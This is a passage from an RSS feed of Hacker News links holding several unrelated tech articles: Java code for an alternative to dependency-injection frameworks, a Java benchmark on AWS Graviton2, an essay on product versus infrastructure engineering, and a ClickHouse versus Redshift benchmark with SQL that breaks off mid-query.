<p><span>That all sounds great, but where does </span><code>Toolbox.getDatabase()</code><span> get its return value from? There are many possible ways to implement this, depending on your specific application and testing needs.</span> Let’s look at a few of them.</p>



<p><span>Simplest possible option: construct a new instance every time:</span></p>


<pre title="">public class Toolbox {
  public static Database getDatabase() { 
    return DatabaseProvider.get(); }
  }
  
  private static class DatabaseProvider {
    static Database get() { 
      return buildDatabase(Toolbox.getConfig()); 
    }
  }
}
</pre>


<p><span>Or if you want to reuse the same Database instance every time, you can use a </span><a rel="noopener" href="https://stackoverflow.com/a/16106598/4816322" target="_blank">singleton holder with lazy-initialization</a><span>:</span></p>


<pre title="">class DatabaseProvider {
  static Database get() { return DefaultHolder.DEFAULT; }

  private static class DefaultHolder {
    private static final DEFAULT = buildDatabase(Toolbox.getConfig());
  }
}
</pre>


<p><span>And suppose you want the ability to inject custom instances, for testing purposes:</span></p>


<pre title="">// Restrict visibility to prevent access from unexpected sources
class DatabaseProvider {
  // throws exception if already set to a different value
  // Prevents any mutations from happening after the first value is set
  static void set(Database db) {...}

  // Returns a default if not set
  static Database get() {...}
}
</pre>


<p><span>And if you want all this to be thread-safe, you can use </span><a rel="noopener" href="https://dzone.com/articles/how-atomicreference-works-in-java" target="_blank">AtomicReference</a><span>. Or you could use a </span><a href="https://gitlab.com/whacks/cava/blob/master/src/main/java/org/rajivprab/cava/DynamicConstant.java"><span>simple utility class that manages thread safety, lazy init, defaults, and immutability</span></a><span>, in order to implement all this in just 5 lines of code.</span></p>


<pre title="">class DatabaseProvider {
  private static final DynamicConstant INSTANCE = 
    DynamicConstant.withDefault(() -&gt; buildDatabase(Toolbox.getConfig()));

  // throws exception if instance is already set to a different value
  // Prevents any mutations from happening after the first value is set
  static void set(Database db) { INSTANCE.set(db); }

  static Database get() { return INSTANCE.get(); }
}
</pre>


<p>You can customize this to fit any particular requirements you have. Thread-safety, immutability, defaults, singletons vs suppliers, injecting fakes for tests – you can implement any of these simply by customizing the DatabaseHolder implementation.</p>



<p><span>Notice that this automatically manages your dependency graph as well. When&nbsp;<code>Toolbox.getDatabase()</code> is invoked, that invokes <code>DatabaseProvider.get()</code>,&nbsp;which will then invoke <code>Toolbox.getConfig()</code><em> </em>if needed, which might in turn transitively invoke its own dependencies via the Toolbox as well.</span></p>



<p><span>In this way, <code>PersonRepo</code> only needs to call <code>Toolbox.getDatabase()</code>, and all transitive dependencies are lazily initialized or constructed (if needed), in order to generate the Database instance.</span></p>



<h2>So… Service Locators?</h2>



<p>Given the superficial similarity to <a href="https://en.wikipedia.org/wiki/Service_locator_pattern" target="_blank" rel="noopener">Service Locators</a>&nbsp;(SL), it’s easy to see why this might seem like a reincarnation of an old idea. However, there are some major differences between the approach described above, and a traditional SL pattern. Differences that completely change the way the system feels and operates.</p>



<p>First, unlike a SL, the above approach cannot be used to request any arbitrary object. The Toolbox only has specific methods defined, such as <code>getDatabase()</code>, which return specific objects. You cannot simply invoke <code>Toolbox.get(MyCustomObject.class)</code>, like you can with a SL.</p>



<p>This restriction might seem like a limitation. But it actually makes your code much safer. It guarantees that all Toolbox users are only using it to request objects that have been explicitly planned for and added to the Toolbox interface. It also allows for programmers to easily figure out which dependencies they can safely get from the Toolbox, and which ones they have to get elsewhere.</p>



<p>The above also provides an additional level of safety: you can ensure that every method exposed by the Toolbox, comes with a default supplier. A default supplier that eliminates any worries that the Toolbox wasn’t properly initialized prior to use. A default supplier that transitively constructs its own dependencies using the Toolbox recursively.</p>



<p>In fact, the right way to do it would be to define default suppliers that always return something that works, and is intended for production use. This way, when running in prod, your code should never have to set any values in the toolbox. It can simply get the lazy-constructed defaults whenever needed. The only use case for setting something in the Toolbox, would be for testing purposes when you want to inject a fake.</p>



<p>Lastly, a SL is designed and intended to be extremely flexible, by allowing for instance injection at any time. This can be a powerful tool, if your application needs such dynamic abilities. However, it can also lead to complex interactions and side-effects as different parts of the application interfere with each other in unintentional or non-intuitive ways.</p>



<p>The Toolbox approach described above isn’t expressly designed to have such capabilities. If you look at the various set methods, you can see that they are programmed to throw exceptions if they conflict with a previously set value. This means that as soon as a value is set, it is then frozen for the rest of the application’s lifespan. You can always customize this in any way you want, by changing the Provider implementation – but I would recommend enforcing some form of consistency.</p>



<p>Combine all of these differences, and you get something that’s completely different from a Service Locator in terms of its uses and drawbacks.</p>



<h2>But Singletons are Bad?</h2>



<p>With respect to Singletons, there’s little difference between the Toolbox approach above, and what you would do with DI frameworks. If you want a new instance every time, you can configure the DatabaseProvider to construct a new instance every time. Alternatively, if you prefer to reuse the same instance every time because …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/">https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/</a></em></p>]]>
            </description>
            <link>https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519596</guid>
            <pubDate>Fri, 18 Sep 2020 17:34:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Testing a real-world Java-based application on Amazon's Arm-based Graviton2]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519510">thread link</a>) | @JacobiX
<br/>
September 18, 2020 | https://www.vneuron.com/compliance/testing-a-realworld-java-based-application-on-amazons-arm-based-graviton2/ | <a href="https://web.archive.org/web/*/https://www.vneuron.com/compliance/testing-a-realworld-java-based-application-on-amazons-arm-based-graviton2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="tm-row-5f678248b172d"><div id="tm-column-5f678248b1909"><div><div><div><div><blockquote><p> “ARM-based built on the Nitro servers for typical LOB-applications</p></blockquote><p>The T4g instances are low cost version of the ARM based VMs. According to Amazon you can enjoy a performance benefit of up to <strong>40%</strong> at a <strong>20%</strong> lower cost in comparison to T3 instances.</p><p>We deployed Reis™ a Java-based application and measured the performance of some typical production payloads. The idea is to deploy a real-world app that uses some popular technologies: PostgreSQL, Java 8, nginx, angular, and Elasticsearch and quickly evaluate the performance of the system.</p></div></div><div><figure><p><img width="573" height="150" src="https://www.vneuron.com/wp-content/uploads/2020/09/tab1.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/tab1.png 573w, https://www.vneuron.com/wp-content/uploads/2020/09/tab1-300x79.png 300w" sizes="(max-width: 573px) 100vw, 573px"></p></figure></div><div><div><p>Most of the needed packages were already available in yum package manager, the installation process was smooth and the installed components worked out of the box. For PostgreSQL, unfortunately, the default yum package is quite outdated (v9). You need to use the Extras catalog to get the version 10.</p><p>For Java JDK, since we use OpenJDK we decided to use Amazon Corretto 8, strangely enough and unlike Amazon Corretto 11 the version 8 is not included in the package manager. So we installed manually the AARCH64 version (again everything worked as documented). After installing nginx, preparing a test database, and configuring the remaining dependencies we were ready to test the setup</p><p>After starting the services, the first thing that I noticed was the horrendous startup time of Java applications. It was unbelievably slow, almost an hour to start the application! for sure I know that it can takes a couple of minutes to start this complex monolithic backend, but if it takes an hour there is something wrong with the setup.</p></div></div><div><div><p>After some sanity checks I couldn’t figure out the root cause of the problem, after calling for assistance from our team, they quickly identified the issue: <strong>dev/random</strong> runs out of available entropy. The app was waiting for <strong>/dev/random</strong> to provide randomness and <strong>/dev/random</strong> typically blocks if there is less entropy available than requested. They suggested that I switch to <strong>/dev/urandom</strong> as the source of cryptographic randomness. A call to cat <strong>/proc/sys/kernel/random/entropy_avail</strong> returns values in the range 70-100. We switched to<strong> /dev/urandom</strong> and now we have a more reasonable boot time (under a minute)!</p><p>Excerpt<b> from /usr/lib/jvm/amazon-corretto-8.265.01.1-linux-aarch64/jre/lib/security/java.security </b></p></div></div><div><figure><p><img width="318" height="120" src="https://www.vneuron.com/wp-content/uploads/2020/09/image1.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/image1.png 318w, https://www.vneuron.com/wp-content/uploads/2020/09/image1-300x113.png 300w" sizes="(max-width: 318px) 100vw, 318px"></p></figure></div><div><p><b>Maybe the Amazon Corretto for AARCH64 distribution shoud use /dev/urandom by default?</b></p></div><div><p>Benchmarking with Bombardier</p></div><div><p>The objective is to determine whether the performance of this Graviton2 based VM are quite competitive. In order to have a baseline, we created an x86 VM with equivalent characteristics (but +27% of the price).</p></div><div><figure><p><img width="566" height="187" src="https://www.vneuron.com/wp-content/uploads/2020/09/tab2-1.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/tab2-1.png 566w, https://www.vneuron.com/wp-content/uploads/2020/09/tab2-1-300x99.png 300w" sizes="(max-width: 566px) 100vw, 566px"></p></figure></div><div><div><p>Since the two VMs have the same OS, we used the exact same scripts to install the dependencies, to deploy the apps and to benchmark it using Bombardier!</p><p><a href="https://github.com/codesenberg/bombardier" target="_blank" rel="noopener noreferrer">Bombardier</a> is a HTTP(S) benchmarking tool. It is written in Go programming language. We compiled it on both VMs.</p><p>We designed 8 production workloads, involving database CRUD, data indexing, search and data encryption and transfer. For each payload we performed 10 tests and picked the median, after each iteration we restarted the jvm.</p></div></div><div><figure><p><img width="640" height="394" src="https://www.vneuron.com/wp-content/uploads/2020/09/screen1.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/screen1.png 702w, https://www.vneuron.com/wp-content/uploads/2020/09/screen1-300x185.png 300w" sizes="(max-width: 640px) 100vw, 640px"></p></figure></div><div><figure><p><img width="640" height="395" src="https://www.vneuron.com/wp-content/uploads/2020/09/screen2.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/screen2.png 897w, https://www.vneuron.com/wp-content/uploads/2020/09/screen2-300x185.png 300w, https://www.vneuron.com/wp-content/uploads/2020/09/screen2-768x474.png 768w" sizes="(max-width: 640px) 100vw, 640px"></p></figure></div><div><div><p>I should admit that I’m pleasantly surprised with the performances of the ARM version of OpenJDK.</p><p>As with any small-scale benchmark we should take it with grain of salt, but we will definitely perform more extensive tests in the upcoming week.</p></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.vneuron.com/compliance/testing-a-realworld-java-based-application-on-amazons-arm-based-graviton2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519510</guid>
            <pubDate>Fri, 18 Sep 2020 17:28:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stop just using “Front end” or “Back end” to describe the Engineering you like]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24519400">thread link</a>) | @lord_sudo
<br/>
September 18, 2020 | https://www.michellelim.org/writing/stop-using-frontend-backend/ | <a href="https://web.archive.org/web/*/https://www.michellelim.org/writing/stop-using-frontend-backend/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p><strong><em>Also posted on Medium <a href="https://medium.com/@michlim97/stop-just-using-frontend-or-backend-to-describe-the-engineering-you-like-e8c392956ada">here</a>.</em></strong></p>
<p>
<img src="https://www.michellelim.org/writing/stop-using-frontend-backend/images/fe-be-cover-photo.png" alt="Stop Using Frontend Backend Cover Photo">
</p>
<p>If there is one tip I could share with my fellow new engineers, it would be… Stop relying on the “Frontend/Backend” axis to understand the engineering you like. <strong>The “Frontend/Backend” axis doesn’t map well to engineers’ motivations.</strong> If you only use that axis, you can end up in projects you don’t like or worse still, give up on engineering prematurely. <strong>Instead, try using the “Product/Infrastructure” axis as the first axis to understand your career preference.</strong></p>
<p>My goal is to share with you the language that could help you (and your manager) find your “sweet spot” engineering role. It took me a couple of bad internship placements and <em>pure luck</em> to figure this out. So I hope that this essay saves some of you months of job mismatch. Shoutout to <a href="https://twitter.com/bolu_ben">Bolu </a>who after my <a href="https://twitter.com/michlimlim/status/1293336552832151559">Tweet thread</a> on this thesis went viral on Tech Twitter, suggested that I turned the thread into an essay<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p>
<p><strong>“Product/Infra” maps neatly to the psychology of how engineers pick projects and their motivations for learning to code.</strong> Broadly speaking, there are 2 types of engineers<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>:</p>
<ol>
<li>
<p>“Product-first” engineers are obsessed with using code to solve a user problem and they see code as just a means to an end.</p>
</li>
<li>
<p>“Code-first” engineers are obsessed with the abstractions, architecture, tools and libraries in the code. Elegant code is the end.</p>
</li>
</ol>
<p>Product-first engineers map to “Product engineering”—building, launching and maintaining features that solve user problems. They often love being in the same room as designers and product managers to learn about users, and they love finding technical opportunities that can improve the product.</p>
<p>Code-first engineers map to “Infrastructure engineering”—building infrastructure platforms that support applications, be it via building CI/CD pipelines, implementing logging, or supporting high traffic etc. They’re motivated to better the craft of programming and are often obsessed with things like test coverage, using the latest technologies, code architecture, etc.</p>
<p>(To be clear, there are “Product engineering” and “Infrastructure engineering” roles whether your users are external customers, third-party developers or internal consumers of an API<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>.)</p>
<p>Notice that both Product engineers and Infrastructure engineers touch the frontend and the backend. Many of them, especially product engineers, choose to specialize into frontend or backend as well. <strong>The “Frontend/Backend” division is still a valuable axis.</strong></p>
<p><strong>However, using the “Frontend/Backend” in isolation of “Product/Infra” in project selection can lead to engineer-job Mismatch. Especially amongst Product engineers.</strong> I am a Product engineer. When I tried out “Backend engineering” in an internship, I was assigned to an Infra role where day-to-day I migrated databases. I had joined the company because I wanted to work on their product. But I didn’t have the language to explain that to my recruiter. They conflated “Backend” with “Infra” and I ended up with a role too far from the user.</p>
<p>When I tried out “Frontend engineering” in another internship, I was assigned to a product close to the user. But the frontend engineers and I were left out of the meetings that discussed how the features would solve problems.</p>
<p>If you split your engineers by the type of technology they work on (i.e. “Frontend/Backend”), it is easy to assume that your Frontend engineers are happy to just work on translating finalized designs into UI/UX components. But if you split them based on their motivations (i.e.”Product/Infra”), you’d want to loop your Frontend product engineers into product discussions.</p>
<p>(The same engineer-job mismatch happens for Infra engineers too, but it is less prevalent because the “Frontend” and “Backend” labels usually only officially apply in Product engineering.)</p>
<p>Now, this next part may be a reach… but I think <strong>many new grad Product engineers choose to be Product <em>Managers</em></strong> <strong>because of this inadequate “Frontend/Backend” division</strong><sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>. Let’s jump back to my two internship examples. How would you feel if these were your only two internships over your college career? Given that you spent 12 weeks in each role, wouldn’t it be reasonable to conclude that those roles were mostly what “frontend” and “backend” were all about? Wouldn’t it be reasonable too to conclude that since you didn’t like both types of engineering, maybe engineering as a whole wasn’t for you? (And this self-dejection is especially easy to fall into if you are part of an underrepresented minority in engineering.) Why not be a <em>Product</em> manager and solve user problems?</p>
<p>This scenario is very common. Engineering is esoteric. Even with an intern-team matching process, an Product engineering intern may not know that they should select Product engineering roles, let alone know which roles are Product engineering roles.</p>
<p><strong>But what if that same intern uses the “Product/Infra” language and advocates for a “Product Engineering” role?</strong></p>
<p>I was such an intern. I was so drained by my Infra role that I reached out to Product Managers in the company to enquire about their jobs. But then I advocated<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> for a Product Engineering role and… my manager gave it to me. As a backend engineer on a product team, I worked with a team to <a href="https://techcrunch.com/2019/10/03/stock-trading-app-robinhood-revamps-its-newsfeed-with-the-wall-street-journal-and-ad-free-videos/">build the Video Newsfeed in Robinhood</a>. I built a large backend pipeline and also had the chance to engage with product questions regarding newsfeed ranking, video tagging, and user engagement. I spoke with engineering, data science, and business, balanced those interests, and wrote the resolution in code.</p>
<p>I found my sweet spot.</p>
<p><strong>At the end of the day, engineering is multifaceted and can be defined along more than one axis:</strong> B2B vs. B2C, B2B top-down vs. B2B “bottom-up”, API-first vs. application-first, “Forward deployed” vs. “Software engineer”, etc. If we’re serious about making engineering accessible to all, we should champion any and all frameworks that can help new engineers find their sweet spot and be happy.</p>
<!-- raw HTML omitted -->
<h3 id="notes">Notes</h3>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>I had met Bolu, a new grad in Bloomberg London, after he sent me a cold DM to thank me for the thread. He had sent my thread to his manager!!! It turned out that he had been struggling to express his project preferences to his manager, and the thread helped. The manager “got” it after reading the thread and now Bolu is on a product development team he is very excited about. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>I took the “code-first” vs. “product-first” engineer terminology from Xoogler Zach Lloyd’s blog: <a href="https://thezbook.com/">https://thezbook.com/</a> <a href="#fnref:2" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:3" role="doc-endnote">
<p>Someone on Twitter (leon @lievetraz) replied with their attempt to classify internal tools teams into “Product/Infra” <a href="https://twitter.com/lievetraz/status/1293555767430336518?s=20">here</a>. <a href="#fnref:3" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:4" role="doc-endnote">
<p>There are hundreds of other reasons engineers choose to be PMs of course. <a href="#fnref:4" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:5" role="doc-endnote">
<p>I learned it the hard way how important it was to advocate for oneself and ask to change teams early. <a href="#fnref:5" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>

		</div></div>]]>
            </description>
            <link>https://www.michellelim.org/writing/stop-using-frontend-backend/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519400</guid>
            <pubDate>Fri, 18 Sep 2020 17:19:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ClickHouse and Redshift Face Off Again in NYC Taxi Rides Benchmark]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518926">thread link</a>) | @krnaveen14
<br/>
September 18, 2020 | https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark | <a href="https://web.archive.org/web/*/https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	

	<p><h2>Setup</h2>
</p><p>We start with the latest ClickHouse version 20.6.6.44 running inside Kubernetes on an Amazon m5.8large EC2 instance. This is a mid-range instance with 32 vCPUs, 128GB of RAM and EBS gp2 storage, that is priced at $1.54 per hour or $36.86 per day in AWS. EBS users also have to pay for storage $3 per terabyte per day.</p><p><h2>Data loading</h2>
</p><p>In previous benchmarks using NYC Taxi Rides datasets, users had to go through a painful and lengthy data transformation process that could take hours. Those times are gone, thanks to contributions to ClickHouse by Altinity engineers. We can use new ClickHouse capabilities in order to load data directly from S3 bucket.&nbsp;</p><p>The data is stored in 96 gzip-ed CSV files, one file per month, several hundred MBs size each:</p><div><figure><img src="https://lh5.googleusercontent.com/MSo9vJvJ5mbEVh4J6xEThcSb7E3MG54byt3KsVSutWJsBJ11Jzqhaz4u_OxQwDWeqZGkwuSXJglvX8yAk0dCHv0oSpjmYo3omH4WgZtkfhhdm2oe_E2YMFoQJyF5_PNl3DAxsVOf" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
</div><p>The total size reported by Amazon is 37.3GB:</p><div><figure>
<p>nyc_taxi_rides/data/tripdata/<br>96 Objects – 37.3 GB</p>
</figure>
</div><p>We are not going to do any transformations of the source data. Only minor tweakings of <a href="https://altinity.com/blog/2019/7/new-encodings-to-improve-clickhouse">table encodings</a> were applied:</p><div><pre><code>CREATE TABLE IF NOT EXISTS tripdata (
  pickup_date Date DEFAULT toDate(pickup_datetime) CODEC(Delta, LZ4),
  id UInt64,
  vendor_id String,
  pickup_datetime DateTime CODEC(Delta, LZ4),
  dropoff_datetime DateTime,
  passenger_count UInt8,
  trip_distance Float32,
  pickup_longitude Float32,
  pickup_latitude Float32,
  rate_code_id String,
  store_and_fwd_flag String,
  dropoff_longitude Float32,
  dropoff_latitude Float32,
  payment_type LowCardinality(String),
  fare_amount Float32,
  extra String,
  mta_tax Float32,
  tip_amount Float32,
  tolls_amount Float32,
  improvement_surcharge Float32,
  total_amount Float32,
  pickup_location_id UInt16,
  dropoff_location_id UInt16,
  junk1 String,
  junk2 String) 
ENGINE = MergeTree
PARTITION BY toYYYYMM(pickup_date) 
ORDER BY (vendor_id, pickup_location_id, pickup_datetime);</code></pre>
</div><p>Once the table is created, data can be loaded with a single SQL statement as:</p><div><pre><code>set max_insert_threads=32;

INSERT INTO tripdata
SELECT *
FROM s3('https://&lt;bucket_name&gt;/nyc_taxi_rides/data/tripdata/data-20*.csv.gz', 
'CSVWithNames', 
'pickup_date Date, id UInt64, vendor_id String, pickup_datetime DateTime, dropoff_datetime DateTime, passenger_count UInt8, trip_distance Float32, pickup_longitude Float32, pickup_latitude Float32, rate_code_id String, store_and_fwd_flag String, dropoff_longitude Float32, dropoff_latitude Float32, payment_type LowCardinality(String), fare_amount Float32, extra String, mta_tax Float32, tip_amount Float32, tolls_amount Float32, improvement_surcharge Float32, total_amount Float32, pickup_location_id UInt16, dropoff_location_id UInt16, junk1 String, junk2 String', 'gzip');</code></pre>
</div><p>Once the table is created, data can be loaded with a single SQL statement as:</p><p>The syntax is not standard; we use the ClickHouse table function ‘s3()’ in order to connect to and read from an S3 bucket. ClickHouse <a href="https://clickhouse.tech/docs/en/sql-reference/table-functions/">table functions</a> are a powerful extension technique that allows to integrate a DBMS with external data sources without changing the SQL syntax. ClickHouse has a bunch of those, and the ‘s3()’ table function is a welcome addition.</p><div><pre><code>0 rows in set. Elapsed: 280.696 sec. Processed 1.31 billion rows, 167.39 GB (4.67 million rows/s., 596.34 MB/s.) </code></pre>
</div><p>It takes less than 5 minutes in order to load 1.3 billion rows from the S3 bucket! Note that wildcards are used in order to load multiple files, and Clickhouse can process gzipped data natively as well!&nbsp;</p><p>In the same way we can load the ‘taxi_zones’ table — the table is small so loading is almost instantaneous from S3.</p><div><pre><code>CREATE TABLE IF NOT EXISTS taxi_zones (
  location_id UInt16,
  zone String,
  create_date Date DEFAULT toDate(0)
) 
ENGINE = MergeTree 
ORDER BY (location_id);

INSERT INTO taxi_zones
SELECT *
FROM s3('https://&lt;bucket_name&gt;/nyc_taxi_rides/data/taxi_zones/data-*.csv.gz', 
'CSVWithNames', 'location_id UInt16, zone String, create_date Date', 'gzip');</code></pre>
</div><p>Once the data is loaded, it is a good practice to inspect table sizes:</p><div><pre><code>SELECT 
    table,
    sum(rows),
    sum(data_uncompressed_bytes) AS uc,
    sum(data_compressed_bytes) AS c,
    uc / c AS ratio
FROM system.parts
WHERE (database = 'default') AND active
GROUP BY table

┌─table─────────────┬──sum(rows)─┬───────────uc─┬───────────c─┬──────────────ratio─┐
│ tripdata          │ 1310903963 │ 104469253248 │ 37563206521 │ 2.7811591778671945 │
│ taxi_zones        │        263 │         5495 │        3697 │ 1.4863402758993778 │
└───────────────────┴────────────┴──────────────┴─────────────┴────────────────────┘</code></pre>
</div><p>As you can see, uncompressed data size is above 100GB, which lands in ClickHouse as 35GB for the main table with 2.8 times compression ratio. We usually expect ClickHouse to compress more aggressively, but the table has a lot of random floats that are hard to pack effectively.</p><p>The data loading process was very fast and convenient and it took us less than 10 minutes to get ready for queries.</p><p><h2>Queries</h2>
</p><p>Following Mark Litwintschik examples we used several simple queries in order to benchmark performance.</p><p>Q1. Group by a single column.</p><div><pre><code>SELECT 
    passenger_count,
    avg(total_amount)
FROM tripdata
GROUP BY passenger_count</code></pre>
</div><p>Q2. Group by two columns.</p><div><pre><code>SELECT 
    passenger_count,
    toYear(pickup_date) AS year,
    count(*)
FROM tripdata
GROUP BY passenger_count, year</code></pre>
</div><p>Q3. Group by three columns.</p><div><pre><code>SELECT 
    passenger_count,
    toYear(pickup_date) AS year,
    round(trip_distance) AS distance,
    count(*)
FROM tripdata
GROUP BY passenger_count, year, distance
ORDER BY year, count(*) DESC</code></pre>
</div><p>We have added two more queries to check joins.</p><p>Q4. Query with a JOIN to taxi_zones table</p><div><pre><code>SELECT 
    tz.zone AS zone,
    count() AS c
FROM tripdata AS td
LEFT JOIN taxi_zones AS tz ON td.pickup_location_id = tz.location_id
GROUP BY zone
ORDER BY c DESC</code></pre>
</div><p>Q5. Where condition on the joined table.</p><div><pre><code>SELECT count(*)
FROM tripdata AS td
INNER JOIN taxi_zones AS tz ON td.pickup_location_id = tz.location_id
WHERE tz.zone = 'Midtown East'</code></pre>
</div><p>Here are the results (all numbers — query time in seconds).</p><div><figure>
<table>
<tbody>
<tr>
<td><strong>Query</strong></td>
<td><strong>ClickHouse</strong><strong><br></strong><strong>m5.8xlarge</strong></td>
</tr>
<tr>
<td>Data load</td>
<td>280</td>
</tr>
<tr>
<td>Q1</td>
<td>0.62</td>
</tr>
<tr>
<td>Q2</td>
<td>1.11</td>
</tr>
<tr>
<td>Q3</td>
<td>1.78</td>
</tr>
<tr>
<td>Q4</td>
<td>0.94</td>
</tr>
<tr>
<td>Q5</td>
<td>0.33</td>
</tr>
</tbody>
</table>
</figure>
</div><p>Numbers do not look bad for a 1.3B rows dataset, but let’s look at comparisons.</p><p><h2>Redshift</h2>
</p><p>Now we repeat the same experience with Redshift. Redshift has a limited number of options for instance types to select from, the closest to m5.8xlarge instances we were using for ClickHouse is Redshift dc2.8xlarge instance. dc2.8xlarge is equipped with 32 vCPUs, 244GB of RAM and 2.5TB local SSD. It is important to note that Redshift forces users to use at least two dc2.8xlarge nodes per cluster, which raises the cost of the cluster to $230.40 per day.</p><div><figure><img src="https://lh4.googleusercontent.com/LEjpOZAvu0WdLq0iHeBye24z2_w-cJpeV2aufz_7BskH5yF_c4avbtI82kaGjzNYdkRjrdDbZh0O2tlc-giCk9yH7sRL9AJApEwE2ZGgdXYRyPdJIRszZAIYC2W91kiT3bD-lRsO" alt="Redshift Cluster" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
</div><div><figure><img src="https://lh6.googleusercontent.com/YW5hRb-i-O5dL5ni-05MzdFEVU0-l4S7DOtDurzUVyyFWQYyvXpwcWhyXgPiXvrq9thD23j6bNmBlmZnZg-HQo2ch028pVXt1UyIyX_I2KWHhJ9nd7YOuakiKZKBu1Dvc8JzAgii" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
</div><p>The data loading is easy using standard SQL COPY statement:</p><div><pre><code>COPY tripdata
FROM 's3://&lt;bucket_name&gt;/nyc_taxi_rides/data/tripdata/'
CREDENTIALS ‘’
DELIMITER ','
  EMPTYASNULL
  ESCAPE
  GZIP
  MAXERROR 100000
  REMOVEQUOTES
  TRIMBLANKS
  IGNOREHEADER
  TRUNCATECOLUMNS;

[2020-07-28 19:43:57] completed in 8 m 26 s 624 ms</code></pre>
</div><p>This is very fast but it takes 80% more time compared to ClickHouse.&nbsp;</p><p>We run the same queries on Redshift using psql with query result cache disabled. Here are the results we’ve got:</p><div><figure>
<table>
<tbody>
<tr>
<td><strong>Query</strong></td>
<td><strong>ClickHouse</strong><strong><br></strong><strong>m5.8xlarge</strong></td>
<td><strong>RedShift dc2.8xlarge x2</strong></td>
</tr>
<tr>
<td>Data load</td>
<td>280</td>
<td>506</td>
</tr>
<tr>
<td>Q1</td>
<td>0.62</td>
<td>0.59</td>
</tr>
<tr>
<td>Q2</td>
<td>1.11</td>
<td>0.82</td>
</tr>
<tr>
<td>Q3</td>
<td>1.78</td>
<td>2.8</td>
</tr>
<tr>
<td>Q4</td>
<td>0.94</td>
<td>0.64</td>
</tr>
<tr>
<td>Q5</td>
<td>0.33</td>
<td>0.45</td>
</tr>
</tbody>
</table>
</figure>
</div><p>As you can see, the query performance is close between the two databases. ClickHouse is slower on some queries, and faster on others. The total query time is lower with ClickHouse, but it is fair to say there is a tie here.</p><p>Let’s note, however, that Redshift is running on two nodes and may distribute data and query execution accordingly. For a fair comparison we need to add one more node to ClickHouse as well.</p><p><h2>Scaling ClickHouse Out</h2>
</p><p>Scaling from one to two servers requires some configuration and schema changes. Please refer to our webinar for the details of ClickHouse clustering:&nbsp; <a href="https://www.youtube.com/watch?v=78rrmC-2G6w">“Strength in Numbers: Introduction to ClickHouse cluster performance”</a>. Since we run ClickHouse inside Kubernetes, we can use Altinity <a href="https://github.com/Altinity/clickhouse-operator">clickhouse-operator</a> for Kubernetes that turns adding a node to the cluster to a one click job.</p><p>When a new node is added to the ClickHouse cluster, data is not redistributed automatically. So there are two options:</p><div><ol>
<li>Reload data from S3 to the distributed table.</li>
<li>Reload data from the local to the distributed table with a simple INSERT SELECT statement.</li>
</ol>
</div><p>We tried the first approach in order to measure load time into a distributed table.</p><div><pre><code>CREATE TABLE tripdata_local ON CLUSTER '{cluster}' AS tripdata;

CREATE TABLE tripdata_d ON CLUSTER '{cluster}' AS tripdata Engine = Distributed('{cluster}', default, tripdata_local, rand());

INSERT INTO tripdata_d SELECT * FROM s3(...);</code></pre>
</div><p>Unfortunately, we hit a problem in ClickHouse at this point. The loading into the distributed table was 3-4 times slower due to lack of parallelisation when processing an insert. This is not acceptable by ClickHouse standards, and <a href="https://github.com/ClickHouse/ClickHouse/pull/14120">a fix</a> has been already submitted. So in order to speed things up until the new ClickHouse version is available, we made a trick and re-distributed the table manually using the following technique:</p><div><pre><code>INSERT INTO tripdata_local SELECT *
FROM tripdata
WHERE (cityHash64(*) % 2) = 0

0 rows in set. Elapsed: 84.095 sec. Processed 1.31 billion rows, 167.40 GB (15.59 million rows/s., 1.99 GB/s.)

INSERT INTO FUNCTION remote('second_node_address', default.tripdata_local) SELECT *
FROM tripdata
WHERE (cityHash64(*) % 2) = 1

